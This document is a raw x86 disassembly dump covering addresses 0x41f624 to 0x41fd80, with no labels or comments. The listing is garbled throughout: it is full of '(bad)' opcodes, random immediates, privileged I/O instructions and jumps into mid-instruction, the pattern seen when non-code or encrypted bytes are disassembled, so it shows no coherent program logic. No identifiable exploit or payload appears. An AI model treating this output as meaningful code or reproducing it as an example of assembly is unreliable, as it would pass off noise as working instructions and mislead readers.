  41f624:	cmp    al,0x1a
  41f626:	add    dh,bl
  41f628:	inc    esi
  41f629:	das    
  41f62a:	js     0x41f625
  41f62c:	int    0x75
  41f62e:	into   
  41f62f:	push   esp
  41f630:	fsubp  st(7),st
  41f632:	js     0x41f658
  41f634:	mov    ds:0x3ad1468a,al
  41f639:	or     BYTE PTR [ebp-0x3c6b27af],dh
  41f63f:	cmp    al,bh
  41f641:	fld    QWORD PTR [ebx+ebx*1-0x2d]
  41f645:	sbb    bh,BYTE PTR [eax-0x30]
  41f648:	scas   al,BYTE PTR es:[edi]
  41f649:	dec    ebx
  41f64a:	loopne 0x41f6b3
  41f64c:	xor    al,0x4e
  41f64e:	jb     0x41f6cc
  41f650:	popa   
  41f651:	(bad)  
  41f652:	cmc    
  41f653:	add    dl,BYTE PTR [ebp-0x54]
  41f656:	les    ecx,FWORD PTR [edx]
  41f658:	shr    BYTE PTR [eax-0x33],1
  41f65b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f65c:	sub    eax,0xb2298841
  41f661:	add    dl,BYTE PTR [esi-0x13]
  41f664:	add    DWORD PTR [esp+esi*2],esi
  41f667:	adc    al,0xb1
  41f669:	and    eax,edi
  41f66b:	mov    ebp,0x124bcc91
  41f670:	sub    BYTE PTR [edx+0x48],dl
  41f673:	icebp  
  41f674:	dec    esi
  41f675:	push   edx
  41f676:	push   0x11
  41f678:	lods   eax,DWORD PTR ds:[esi]
  41f679:	fdiv   DWORD PTR [edi+0x79dce4af]
  41f67f:	mov    bl,0x84
  41f681:	int3   
  41f682:	cmp    bh,BYTE PTR [esi]
  41f684:	frstor [edi]
  41f686:	retf   0xe8a
  41f689:	mov    DWORD PTR [edx],ebp
  41f68b:	cmc    
  41f68c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f68d:	aam    0xd
  41f68f:	clc    
  41f690:	adc    al,0xaa
  41f692:	inc    edx
  41f693:	xor    ebx,DWORD PTR [edx+0x4cdea8eb]
  41f699:	xor    dh,BYTE PTR [ecx-0x25]
  41f69c:	jbe    0x41f621
  41f69e:	in     al,0x12
  41f6a0:	adc    edi,DWORD PTR ds:0x504bd5e7
  41f6a6:	jp     0x41f6b7
  41f6a8:	loop   0x41f6a7
  41f6aa:	jl     0x41f6bc
  41f6ac:	mov    dh,0x76
  41f6ae:	out    dx,al
  41f6af:	or     eax,0x30673ce
  41f6b4:	sub    cl,BYTE PTR [eax]
  41f6b6:	mov    ebp,ecx
  41f6b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6b9:	and    DWORD PTR [esi+0x1fcd1eeb],0x66
  41f6c0:	ins    DWORD PTR es:[edi],dx
  41f6c1:	sub    esp,esp
  41f6c3:	js     0x41f737
  41f6c5:	add    bh,BYTE PTR [eax+0x48]
  41f6c8:	cli    
  41f6c9:	or     eax,0x5cc2e197
  41f6ce:	sub    BYTE PTR [ebx],cl
  41f6d0:	add    al,0x97
  41f6d2:	mov    gs,WORD PTR [ebp+ebp*4-0x4e]
  41f6d6:	push   edx
  41f6d7:	adc    al,dl
  41f6d9:	int3   
  41f6da:	and    edx,0x2e28f114
  41f6e0:	shl    DWORD PTR [ecx-0x16fb9a93],0x74
  41f6e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6e8:	mov    eax,ds:0xd2837557
  41f6ed:	inc    edx
  41f6ee:	add    ebp,DWORD PTR [ebx-0x1de286c7]
  41f6f4:	sbb    bh,ch
  41f6f6:	or     eax,0xa11b6e8b
  41f6fb:	lods   eax,DWORD PTR ds:[esi]
  41f6fc:	xlat   BYTE PTR ds:[ebx]
  41f6fd:	out    0xfc,al
  41f6ff:	leave  
  41f700:	je     0x41f764
  41f702:	repz sub dl,BYTE PTR [eax]
  41f705:	mov    al,0x66
  41f708:	sbb    esp,DWORD PTR [esi]
  41f70a:	and    dl,BYTE PTR [ebx+0x7b]
  41f70d:	(bad)  
  41f70f:	test   BYTE PTR [esi-0x6c],dl
  41f712:	jecxz  0x41f69b
  41f714:	xor    DWORD PTR [esi+0x21267c4d],edx
  41f71a:	jmp    0x41f6bd
  41f71c:	and    al,0xcb
  41f71e:	lods   al,BYTE PTR ds:[esi]
  41f71f:	retf   0xf72b
  41f722:	mov    ebp,0xe626b580
  41f727:	aas    
  41f728:	add    DWORD PTR [edi+0x23],edx
  41f72b:	stos   BYTE PTR es:[edi],al
  41f72c:	dec    esp
  41f72d:	and    al,0xa8
  41f72f:	jecxz  0x41f750
  41f731:	or     BYTE PTR [edx-0x67357eb2],0x1a
  41f738:	js     0x41f71a
  41f73a:	popa   
  41f73b:	adc    BYTE PTR [edi+ecx*2],bh
  41f73e:	xlat   BYTE PTR ds:[ebx]
  41f73f:	rcr    bh,0x51
  41f742:	mov    al,0xa4
  41f744:	inc    ecx
  41f745:	call   0x51c29843
  41f74a:	push   eax
  41f74b:	rol    DWORD PTR [esi-0x3dd604ff],cl
  41f751:	test   ebp,0x1cb658a9
  41f757:	inc    esp
  41f758:	cld    
  41f759:	je     0x41f782
  41f75b:	add    al,0xf0
  41f75d:	pop    ecx
  41f75e:	xchg   edi,eax
  41f75f:	in     al,dx
  41f760:	or     al,BYTE PTR [edx+0x61]
  41f763:	popf   
  41f764:	(bad)  
  41f765:	xchg   ebx,eax
  41f766:	in     eax,0xa6
  41f768:	mov    ebp,0x9d3a411f
  41f76d:	adc    dl,BYTE PTR ds:0xd9149fd9
  41f773:	mov    ebp,0x522d9fd8
  41f778:	sbb    BYTE PTR [ecx],ch
  41f77a:	xor    BYTE PTR [esi-0x4a],ch
  41f77d:	and    eax,0x602e40ad
  41f782:	mul    DWORD PTR [eax+0x34c2495c]
  41f788:	lahf   
  41f789:	loop   0x41f802
  41f78b:	popf   
  41f78c:	inc    eax
  41f78d:	mov    esp,edx
  41f78f:	or     DWORD PTR [edi],0x10
  41f792:	cli    
  41f793:	mov    edi,0x1fcd6e4c
  41f798:	inc    ecx
  41f799:	stc    
  41f79a:	aad    0xcd
  41f79c:	xor    al,0x92
  41f79e:	call   DWORD PTR [ecx+0x4]
  41f7a1:	push   esp
  41f7a2:	jle    0x41f7bc
  41f7a4:	mov    esi,DWORD PTR [eax+ebp*2+0x7e29bbdc]
  41f7ab:	sub    ah,bl
  41f7ad:	adc    al,0x5
  41f7af:	test   BYTE PTR [esi-0x2e],dl
  41f7b2:	push   esp
  41f7b3:	ins    BYTE PTR es:[edi],dx
  41f7b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7b5:	or     BYTE PTR [edx-0x365366f5],ch
  41f7bb:	sahf   
  41f7bc:	pop    ds
  41f7bd:	in     eax,0x63
  41f7bf:	dec    edi
  41f7c0:	fadd   QWORD PTR [edx+0x61dd96b3]
  41f7c6:	sbb    eax,0xbdbd185f
  41f7cb:	gs scas eax,DWORD PTR es:[edi]
  41f7cd:	popf   
  41f7ce:	enter  0x7ec7,0x4e
  41f7d2:	cmc    
  41f7d3:	iret   
  41f7d4:	shl    DWORD PTR [ebx+edi*4+0x79],0xac
  41f7d9:	cmp    al,0x7b
  41f7db:	push   ss
  41f7dc:	or     dh,bl
  41f7de:	out    0xf2,al
  41f7e0:	jns    0x41f79a
  41f7e2:	mov    esi,0x83814891
  41f7e7:	loopne 0x41f7e1
  41f7e9:	mov    al,ds:0x2eaa55c3
  41f7ee:	add    esi,DWORD PTR [edx]
  41f7f0:	sub    al,0xe8
  41f7f2:	add    DWORD PTR [edx],edi
  41f7f4:	xor    esi,esp
  41f7f6:	clc    
  41f7f7:	ins    BYTE PTR es:[edi],dx
  41f7f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7f9:	jecxz  0x41f78a
  41f7fb:	sbb    eax,0xfce7d7f0
  41f800:	adc    BYTE PTR [eax-0x6c3bf877],al
  41f806:	ja     0x41f794
  41f808:	push   eax
  41f809:	sahf   
  41f80a:	test   al,0x41
  41f80c:	cdq    
  41f80d:	pushf  
  41f80e:	jne    0x41f849
  41f810:	fsubr  QWORD PTR [edi+0x67de4ff2]
  41f816:	lds    esp,FWORD PTR [eax+0x48a48b86]
  41f81c:	(bad)  
  41f81d:	lock xchg BYTE PTR [ebx+0x1c],dh
  41f821:	add    eax,0xdb2baabf
  41f826:	or     eax,0x75893c0c
  41f82b:	call   0xa42f:0x67a852ab
  41f832:	cwde   
  41f833:	inc    esp
  41f834:	repz sahf 
  41f836:	lahf   
  41f837:	mov    dl,0xe7
  41f839:	(bad)  
  41f83b:	or     eax,0xb7f0dd9a
  41f840:	or     al,0xfd
  41f842:	dec    di
  41f844:	into   
  41f845:	adc    eax,DWORD PTR [ebp-0x33]
  41f848:	or     DWORD PTR [esi-0x1b],ecx
  41f84b:	xor    ch,BYTE PTR [eax+0x12c2237e]
  41f851:	call   DWORD PTR [ebp+0x4afd8233]
  41f857:	jmp    0x4fa3412c
  41f85c:	pop    ebp
  41f85d:	(bad)  
  41f85e:	inc    edx
  41f85f:	shl    esi,0x48
  41f862:	jecxz  0x41f831
  41f864:	fld    TBYTE PTR [edi]
  41f866:	jecxz  0x41f841
  41f868:	mov    ds:0x697f9b40,al
  41f86d:	jns    0x41f826
  41f86f:	inc    ebx
  41f870:	jbe    0x41f8f1
  41f872:	jne    0x41f8cc
  41f874:	addr16 pop es
  41f876:	pop    ebx
  41f877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f878:	lods   al,BYTE PTR ds:[esi]
  41f879:	mov    dh,0xd
  41f87b:	inc    esi
  41f87c:	push   0x5ecd62f7
  41f881:	push   esi
  41f882:	jne    0x41f8ae
  41f884:	aad    0x84
  41f886:	dec    ecx
  41f887:	int3   
  41f888:	and    eax,0x25d595de
  41f88d:	ins    DWORD PTR es:[edi],dx
  41f88e:	(bad)  [eax]
  41f890:	cmc    
  41f891:	mov    esp,0x3a274f88
  41f896:	lods   eax,DWORD PTR ds:[esi]
  41f897:	int3   
  41f898:	ins    BYTE PTR es:[edi],dx
  41f899:	stos   BYTE PTR es:[edi],al
  41f89a:	xchg   BYTE PTR [ebp+0x7a5d56d2],ah
  41f8a0:	xchg   BYTE PTR [eax-0x3c],bl
  41f8a3:	xchg   DWORD PTR [eax-0x3790b2cd],esi
  41f8a9:	mov    ebx,0x436c12a5
  41f8ae:	inc    BYTE PTR [edi+0x3]
  41f8b1:	daa    
  41f8b2:	inc    esp
  41f8b3:	outs   dx,BYTE PTR ds:[esi]
  41f8b4:	ret    0x42f7
  41f8b7:	sar    DWORD PTR [edx+0x6c],0xf1
  41f8bb:	(bad)  
  41f8bd:	sub    ah,al
  41f8bf:	scas   eax,DWORD PTR es:[edi]
  41f8c0:	inc    edi
  41f8c1:	mov    ecx,0x4ee37157
  41f8c6:	ret    0x966b
  41f8c9:	inc    ecx
  41f8ca:	pushf  
  41f8cb:	mul    ch
  41f8cd:	pop    ds
  41f8ce:	mov    ecx,DWORD PTR [edi+0x6ebe722a]
  41f8d4:	mov    esi,0x26d66416
  41f8d9:	cmp    ebp,DWORD PTR [edi]
  41f8db:	nop
  41f8dc:	cmc    
  41f8dd:	mov    bh,0x80
  41f8df:	inc    ebx
  41f8e0:	cwde   
  41f8e1:	leave  
  41f8e2:	out    0x17,al
  41f8e4:	es das 
  41f8e6:	cli    
  41f8e7:	add    edx,ebp
  41f8e9:	or     BYTE PTR [ebx-0x1f],0xf9
  41f8ed:	int3   
  41f8ee:	dec    esp
  41f8ef:	lods   eax,DWORD PTR ds:[esi]
  41f8f0:	popa   
  41f8f1:	enter  0xfa7e,0x10
  41f8f5:	dec    ebp
  41f8f6:	pop    edx
  41f8f7:	inc    edi
  41f8f8:	stc    
  41f8f9:	std    
  41f8fa:	push   ds
  41f8fb:	fcom   st(1)
  41f8fd:	sbb    eax,0x7b7cec0
  41f902:	fsubr  st(6),st
  41f904:	(bad)  
  41f905:	dec    eax
  41f906:	stos   DWORD PTR es:[edi],eax
  41f907:	mov    ebp,0xc132057b
  41f90c:	mov    ds:0xe883eb6d,al
  41f911:	adc    al,al
  41f913:	lock js 0x41f950
  41f916:	mul    DWORD PTR [edx+0x5141c769]
  41f91c:	mov    al,ds:0x2ef4b0cd
  41f921:	mov    ch,0x8d
  41f923:	or     DWORD PTR [ebx-0x635cc56e],0x27
  41f92a:	in     al,dx
  41f92b:	aad    0x97
  41f92d:	aas    
  41f92e:	dec    eax
  41f92f:	int    0xc2
  41f931:	sti    
  41f932:	push   ecx
  41f933:	mov    ebx,0xbe25bb10
  41f938:	ret    
  41f939:	dec    ecx
  41f93a:	push   es
  41f93b:	dec    eax
  41f93c:	xchg   ecx,eax
  41f93d:	mov    al,0xe8
  41f93f:	iret   
  41f940:	fstp   TBYTE PTR gs:[edx-0x3d]
  41f944:	out    dx,eax
  41f945:	or     eax,DWORD PTR [ecx]
  41f947:	pop    ecx
  41f948:	cmc    
  41f949:	popf   
  41f94a:	sbb    ch,BYTE PTR [esi]
  41f94c:	(bad)  [edi]
  41f94e:	retf   0x48dd
  41f951:	call   0x7ad22216
  41f956:	dec    ecx
  41f957:	push   es
  41f958:	jg     0x41f961
  41f95a:	call   0x6f8e:0x43a94149
  41f961:	push   cs
  41f962:	cmp    bh,al
  41f964:	cmp    eax,0xc4d26dfc
  41f969:	adc    DWORD PTR [eax],eax
  41f96b:	sub    DWORD PTR ds:0xc2f7379b,edi
  41f971:	jmp    0x17dc4664
  41f976:	or     BYTE PTR [ecx+edx*1],bl
  41f979:	mov    gs,WORD PTR [ebx-0x79]
  41f97c:	jle    0x41f994
  41f97e:	inc    esp
  41f97f:	test   DWORD PTR [ebx-0x213ee99a],esi
  41f985:	test   BYTE PTR [ebx-0x2f794445],ah
  41f98b:	int3   
  41f98c:	pop    esi
  41f98d:	scas   eax,DWORD PTR es:[edi]
  41f98e:	ja     0x41f9c4
  41f990:	cmp    eax,0xd0c82a58
  41f995:	inc    esi
  41f996:	mov    dh,0x79
  41f998:	pop    esp
  41f999:	stos   BYTE PTR es:[edi],al
  41f99a:	mov    ds:0xb1d3833c,al
  41f99f:	adc    eax,0x9a43a148
  41f9a4:	lods   al,BYTE PTR ds:[esi]
  41f9a5:	mov    bl,0xaa
  41f9a7:	int3   
  41f9a8:	das    
  41f9a9:	pushf  
  41f9aa:	fmul   QWORD PTR [edx]
  41f9ac:	or     al,0x93
  41f9ae:	push   es
  41f9af:	int    0x72
  41f9b1:	mov    DWORD PTR [ecx],0x2fbd966d
  41f9b7:	mov    bh,0x98
  41f9b9:	push   ds
  41f9ba:	test   DWORD PTR [eax+ebp*4-0x39],edx
  41f9be:	imul   ecx,DWORD PTR [eax+edx*2],0xffffffbe
  41f9c2:	mov    ebp,0xff89c9d7
  41f9c7:	xor    eax,0x15888d0d
  41f9cc:	call   0xd243b1ee
  41f9d1:	mov    esi,0xfe8d98e5
  41f9d6:	call   0xb4f2d239
  41f9db:	je     0x41fa43
  41f9dd:	out    dx,eax
  41f9de:	stos   BYTE PTR es:[edi],al
  41f9df:	inc    esi
  41f9e0:	or     esi,0xac9b1520
  41f9e6:	push   cs
  41f9e7:	fdiv   st,st(6)
  41f9e9:	sub    al,BYTE PTR [edi-0x765db8ba]
  41f9ef:	cmp    ah,BYTE PTR [eax]
  41f9f1:	mov    ebx,0x605b2132
  41f9f6:	xlat   BYTE PTR ds:[ebx]
  41f9f7:	jle    0x41fa57
  41f9f9:	add    al,0x7b
  41f9fb:	repz jmp 0x167a216b
  41fa01:	adc    al,0x9
  41fa03:	xchg   BYTE PTR [ecx+edx*2+0x1ed1a82a],ch
  41fa0a:	pop    ebp
  41fa0b:	adc    edx,ebx
  41fa0d:	retf   0x48f7
  41fa10:	xchg   BYTE PTR [edx+esi*8],bh
  41fa13:	pusha  
  41fa14:	mov    eax,0xda36dffe
  41fa19:	gs inc ebp
  41fa1b:	lds    ecx,FWORD PTR [eax]
  41fa1d:	call   0x4306:0xac1f6cb5
  41fa24:	jns    0x41fa39
  41fa26:	sub    cl,ch
  41fa28:	ret    0x9701
  41fa2b:	in     al,0x43
  41fa2d:	jle    0x41fa74
  41fa2f:	jnp    0x41fa39
  41fa31:	and    al,0x4f
  41fa33:	xor    eax,0x7f4feff9
  41fa38:	push   es
  41fa39:	bound  esi,QWORD PTR [ecx]
  41fa3b:	inc    esp
  41fa3c:	cmp    al,0x1e
  41fa3e:	cmp    DWORD PTR [ecx+ebx*1],edi
  41fa41:	imul   edi,DWORD PTR [edx+0x6b],0xabd7e7be
  41fa48:	sahf   
  41fa49:	inc    edx
  41fa4a:	sbb    dh,BYTE PTR [eax+0x1f]
  41fa4d:	mov    dl,0x2d
  41fa4f:	addr16 jl 0x41fa58
  41fa52:	and    bh,BYTE PTR [eax+eiz*8+0x72]
  41fa56:	push   esi
  41fa57:	inc    ebx
  41fa58:	out    0xa8,eax
  41fa5a:	dec    edx
  41fa5b:	in     al,0xbd
  41fa5d:	pop    edi
  41fa5e:	or     eax,0x6c171aa6
  41fa63:	xchg   ebp,eax
  41fa64:	pop    ecx
  41fa65:	sahf   
  41fa66:	aam    0xde
  41fa68:	jle    0x41fa82
  41fa6a:	scas   eax,DWORD PTR es:[edi]
  41fa6b:	sbb    ebx,DWORD PTR [ebx-0x75]
  41fa6e:	fistp  DWORD PTR [edi+0x4f81bdc4]
  41fa74:	ja     0x41fa0c
  41fa76:	(bad)  
  41fa77:	enter  0x3c2b,0x55
  41fa7b:	pop    ds
  41fa7c:	cmp    al,0x7c
  41fa7e:	daa    
  41fa7f:	ror    DWORD PTR [ebx+0x394af4e5],0x8a
  41fa86:	(bad)  
  41fa87:	je     0x41fa20
  41fa89:	mov    eax,0xf61613f2
  41fa8e:	and    eax,0x91239e53
  41fa93:	in     al,0x8c
  41fa95:	jecxz  0x41fafa
  41fa97:	shl    DWORD PTR [edx],cl
  41fa99:	xor    edi,DWORD PTR [esi-0x34]
  41fa9c:	outs   dx,BYTE PTR ds:[esi]
  41fa9d:	adc    BYTE PTR [edx+0x61],0x87
  41faa1:	sub    eax,0xb9b1887e
  41faa6:	rcr    BYTE PTR [edx+0x73c38112],1
  41faac:	mov    BYTE PTR [ebp-0x46f34c61],ch
  41fab2:	sbb    al,0xd
  41fab4:	push   ds
  41fab5:	add    esp,ebx
  41fab7:	adc    DWORD PTR [edi+0x6d],esi
  41faba:	outs   dx,BYTE PTR ds:[esi]
  41fabb:	aaa    
  41fabc:	cdq    
  41fabd:	fisttp QWORD PTR [ecx-0x57]
  41fac0:	lea    edi,[ecx-0x613ad80e]
  41fac6:	cmp    ebp,DWORD PTR cs:[edi-0x60]
  41faca:	xlat   BYTE PTR ds:[ebx]
  41facb:	bound  ecx,QWORD PTR [ecx+0x549ad91a]
  41fad1:	mov    edx,0xfb74067f
  41fad6:	xchg   DWORD PTR [esi+ebx*8],ecx
  41fad9:	ret    
  41fada:	imul   ebp,DWORD PTR [ecx-0x56],0x7f
  41fade:	dec    bh
  41fae0:	shl    ebp,cl
  41fae2:	je     0x41fa96
  41fae4:	fs inc edx
  41fae6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fae7:	or     eax,0xae2f7db9
  41faec:	xchg   DWORD PTR [ebx+esi*4],ebp
  41faef:	sbb    BYTE PTR [edi+0x44],bh
  41faf2:	in     al,0x13
  41faf4:	scas   eax,DWORD PTR es:[edi]
  41faf5:	lds    edi,FWORD PTR [ecx]
  41faf7:	push   es
  41faf8:	mov    esp,0x84bedc9
  41fafd:	out    0xf7,eax
  41faff:	push   esp
  41fb00:	stos   DWORD PTR es:[edi],eax
  41fb01:	mov    ch,0xce
  41fb03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb04:	and    esi,DWORD PTR [ebx+0x1c]
  41fb07:	inc    ebx
  41fb08:	sbb    BYTE PTR [edx],bl
  41fb0a:	pop    es
  41fb0b:	adc    DWORD PTR [edi+0x488f6af],0x25bf9f59
  41fb15:	mov    DWORD PTR [edx],ebp
  41fb17:	ins    DWORD PTR es:[edi],dx
  41fb18:	popf   
  41fb19:	(bad)  
  41fb1a:	std    
  41fb1b:	dec    esp
  41fb1c:	jne    0x41faf7
  41fb1e:	xor    ah,al
  41fb20:	aam    0xd1
  41fb22:	jo     0x41fad7
  41fb24:	jge    0x41fb29
  41fb26:	push   ds
  41fb27:	mov    esi,0xf521f283
  41fb2c:	or     eax,DWORD PTR [edi-0x1a]
  41fb2f:	mul    BYTE PTR [di+0xdc]
  41fb34:	push   0x33
  41fb36:	(bad)
  41fb3a:	or     DWORD PTR [esi],0x55
  41fb3d:	add    esi,DWORD PTR [edi-0x35]
  41fb40:	or     dh,dl
  41fb42:	ins    BYTE PTR es:[edi],dx
  41fb43:	test   BYTE PTR [esi],dl
  41fb45:	pop    edx
  41fb46:	dec    BYTE PTR [ebx-0x4c]
  41fb49:	enter  0x6195,0x3c
  41fb4d:	clc    
  41fb4e:	rol    BYTE PTR [eax],0x45
  41fb51:	add    eax,0x84cae8bd
  41fb56:	mov    WORD PTR [eax],ds
  41fb58:	int    0x4
  41fb5a:	adc    BYTE PTR [eax],bl
  41fb5c:	dec    ebx
  41fb5d:	addr16 cld 
  41fb5f:	aaa    
  41fb60:	mov    eax,ds:0x2c6ec68f
  41fb65:	mov    esp,0xc4bdb67b
  41fb6a:	add    BYTE PTR [esi+0x4fa8d926],bl
  41fb70:	adc    dl,BYTE PTR [ecx+0x10]
  41fb73:	bound  eax,QWORD PTR [ebx+0x2d427744]
  41fb79:	add    al,0xad
  41fb7b:	sub    cl,dl
  41fb7d:	fcomp  QWORD PTR [edx+0x63]
  41fb80:	cdq    
  41fb81:	jge    0x41fb5f
  41fb83:	or     al,0x4f
  41fb85:	sar    cl,cl
  41fb87:	xchg   ebp,eax
  41fb88:	fdiv   QWORD PTR [ecx+eax*8-0x1f57e74a]
  41fb8f:	xor    al,0x79
  41fb91:	sub    edi,DWORD PTR [ebp-0x58]
  41fb94:	and    eax,0x1736332e
  41fb99:	nop
  41fb9a:	lea    esi,ds:0xbc5c9b80
  41fba0:	inc    eax
  41fba1:	pushf  
  41fba2:	outs   dx,DWORD PTR ds:[esi]
  41fba3:	xchg   ebx,eax
  41fba4:	adc    eax,0x9a51af2c
  41fba9:	fist   WORD PTR [esi]
  41fbab:	jbe    0x41fbcd
  41fbad:	pushf  
  41fbae:	neg    DWORD PTR [esi+esi*8]
  41fbb1:	(bad)  
  41fbb3:	xchg   ecx,eax
  41fbb4:	mov    esi,0xd7feebc
  41fbb9:	fdiv   st(2),st
  41fbbb:	add    eax,DWORD PTR [ebp+0x6b]
  41fbbe:	jecxz  0x41fc2a
  41fbc0:	mov    esi,0xba057aaf
  41fbc5:	div    BYTE PTR [ecx+ebx*1-0x6d]
  41fbc9:	ds jne 0x41fc16
  41fbcc:	xchg   edi,eax
  41fbcd:	test   al,0xcd
  41fbcf:	out    0xb9,eax
  41fbd1:	fisttp WORD PTR [ebx]
  41fbd3:	xchg   BYTE PTR [esi-0x3d],ch
  41fbd6:	mov    ch,0xd4
  41fbd8:	push   ebx
  41fbd9:	inc    ecx
  41fbda:	neg    DWORD PTR [eax-0x524f69b8]
  41fbe0:	add    bh,bh
  41fbe2:	dec    BYTE PTR [ebx-0x1ef98450]
  41fbe8:	stos   DWORD PTR es:[edi],eax
  41fbe9:	sub    eax,0x3b6f228d
  41fbee:	add    ch,BYTE PTR [ebx+0xc]
  41fbf1:	pop    edi
  41fbf2:	in     eax,dx
  41fbf3:	clc    
  41fbf4:	pop    ebx
  41fbf5:	outs   dx,DWORD PTR ds:[esi]
  41fbf6:	addr16 jo 0x41fb90
  41fbf9:	add    BYTE PTR ss:[esp+eax*2],ah
  41fbfd:	add    edi,DWORD PTR [eax]
  41fbff:	adc    al,0x9c
  41fc01:	ficomp DWORD PTR [edi]
  41fc03:	jmp    0x41fb95
  41fc05:	cmp    DWORD PTR [edi-0x36a0a774],edi
  41fc0b:	mov    ah,0xaf
  41fc0d:	fs pop ebx
  41fc0f:	imul   eax,DWORD PTR [ebx-0x38f296a7],0x5b
  41fc16:	push   esp
  41fc17:	fstp   TBYTE PTR [edi+esi*8]
  41fc1a:	pop    esi
  41fc1b:	xchg   esp,eax
  41fc1c:	xor    BYTE PTR [ecx+0x4cc19c13],al
  41fc22:	outs   dx,BYTE PTR ds:[esi]
  41fc23:	cmc    
  41fc24:	mov    al,BYTE PTR [esi+0x5bd41bf]
  41fc2a:	repnz adc ch,BYTE PTR [ebx-0x62]
  41fc2e:	call   0xae76:0x3cfac180
  41fc35:	adc    edi,DWORD PTR [eax+0x61]
  41fc38:	xchg   ebp,eax
  41fc39:	xchg   BYTE PTR [ebp-0x33],ch
  41fc3c:	mov    eax,ds:0x27b5ecff
  41fc41:	(bad)  
  41fc42:	(bad)  
  41fc43:	outs   dx,BYTE PTR ds:[esi]
  41fc44:	dec    esi
  41fc45:	test   al,0x61
  41fc47:	xor    ecx,DWORD PTR [esi]
  41fc49:	push   cs
  41fc4a:	pop    edx
  41fc4b:	dec    esp
  41fc4c:	out    0x78,eax
  41fc4e:	cdq    
  41fc4f:	int    0xb4
  41fc51:	pop    DWORD PTR ds:[ecx]
  41fc54:	dec    ebp
  41fc55:	bound  eax,QWORD PTR [ebp-0x6bcf4275]
  41fc5b:	and    eax,0x1d3e1b5e
  41fc60:	cdq    
  41fc61:	aas    
  41fc62:	mov    dh,0x66
  41fc64:	and    eax,0x64f9ab5d
  41fc69:	not    DWORD PTR [esi-0x48]
  41fc6c:	push   cs
  41fc6d:	imul   ecx,DWORD PTR [eax],0x74b27d1d
  41fc73:	mov    bl,0x53
  41fc75:	mov    esp,0x5029b55a
  41fc7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc7b:	xchg   edx,eax
  41fc7c:	cmp    al,0x93
  41fc7e:	cdq    
  41fc7f:	or     ch,0x73
  41fc82:	xchg   ebx,eax
  41fc83:	mov    dh,0xde
  41fc85:	mov    ebp,DWORD PTR [esi+ebp*8-0x58]
  41fc89:	or     eax,0xfd51e465
  41fc8e:	rep ins DWORD PTR es:[edi],dx
  41fc90:	xor    eax,0x4fa3d734
  41fc95:	push   0xffffff9b
  41fc97:	das    
  41fc98:	jecxz  0x41fc7f
  41fc9a:	or     esp,0x22
  41fc9d:	adc    al,0x8a
  41fc9f:	sbb    eax,0xa38edaf0
  41fca4:	push   ss
  41fca5:	jmp    0x8607393a
  41fcaa:	xchg   ebx,eax
  41fcab:	jae    0x41fd1c
  41fcad:	pop    edx
  41fcae:	mov    DWORD PTR [esi+0x653cedfc],ecx
  41fcb4:	les    edx,FWORD PTR [ebx*4+0x364d59ce]
  41fcbb:	mov    esp,0x2f81fe46
  41fcc0:	mov    edx,0xe7cc2145
  41fcc5:	lods   eax,DWORD PTR ds:[esi]
  41fcc6:	stos   DWORD PTR es:[edi],eax
  41fcc7:	xchg   edx,eax
  41fcc8:	fwait
  41fcc9:	stos   DWORD PTR es:[edi],eax
  41fcca:	dec    esi
  41fccb:	in     al,dx
  41fccc:	sub    eax,esi
  41fcce:	imul   edx,DWORD PTR [esi*8+0x664b88d0],0x8691aec6
  41fcd9:	push   ebp
  41fcda:	mov    BYTE PTR [ebx-0x45602fb1],0x9f
  41fce1:	stos   BYTE PTR es:[edi],al
  41fce2:	pushf  
  41fce3:	xor    BYTE PTR [edx-0x3b066968],dh
  41fce9:	shl    bl,cl
  41fceb:	ds mov ah,0xcb
  41fcee:	mov    eax,ds:0xe5732b95
  41fcf3:	xor    al,0x25
  41fcf5:	push   eax
  41fcf6:	jb     0x41fcdc
  41fcf8:	add    al,0xb5
  41fcfa:	or     ch,al
  41fcfc:	xchg   DWORD PTR [edi+esi*2],ebp
  41fcff:	in     eax,0x2c
  41fd01:	xchg   ebp,eax
  41fd02:	ja     0x41fcd1
  41fd04:	cmp    dl,cl
  41fd06:	and    eax,0x1e39a9fb
  41fd0b:	ret    0x593
  41fd0e:	fsubr  QWORD PTR [ecx]
  41fd10:	dec    ecx
  41fd11:	jmp    0x41fc9a
  41fd13:	ret    0xf115
  41fd16:	xchg   BYTE PTR [eax-0x3d0f58b7],bl
  41fd1c:	lds    edi,FWORD PTR [ebx-0x12]
  41fd1f:	jne    0x41fd56
  41fd21:	cli    
  41fd22:	sub    al,0xc4
  41fd24:	or     al,0x29
  41fd26:	imul   ecx,ebp,0xffffffee
  41fd29:	shl    edi,0xce
  41fd2c:	ss xchg ebp,eax
  41fd2e:	into   
  41fd2f:	or     al,0xf3
  41fd31:	sbb    eax,0x84b2b1db
  41fd36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd37:	adc    dh,dh
  41fd39:	loopne 0x41fd76
  41fd3b:	jb     0x41fdbb
  41fd3d:	dec    esi
  41fd3e:	(bad)  [edx+0x10]
  41fd41:	rol    DWORD PTR [ecx+0x355098df],cl
  41fd47:	push   edi
  41fd48:	(bad)
  41fd4b:	inc    edi
  41fd4c:	adc    DWORD PTR [esi+ebp*8],ebx
  41fd4f:	scas   al,BYTE PTR es:[edi]
  41fd50:	inc    edi
  41fd51:	mov    ch,cl
  41fd53:	stos   DWORD PTR es:[edi],eax
  41fd54:	arpl   ax,ax
  41fd56:	retf   0x54ad
  41fd59:	clc    
  41fd5a:	fild   WORD PTR ds:0xfe28acfe
  41fd60:	and    eax,0x3e1dbe50
  41fd65:	or     al,BYTE PTR [ebx]
  41fd67:	or     eax,0x599258d7
  41fd6c:	or     BYTE PTR [ecx-0x31],cl
  41fd6f:	mov    bh,0x4a
  41fd71:	sub    eax,0x583534e8
  41fd76:	xchg   BYTE PTR [ebp+0x64be0e9b],bh
  41fd7c:	out    dx,eax
  41fd7d:	cs xchg cl,al
  41fd80:	adc    BYTE PTR [edi-0x686e8c10],bh
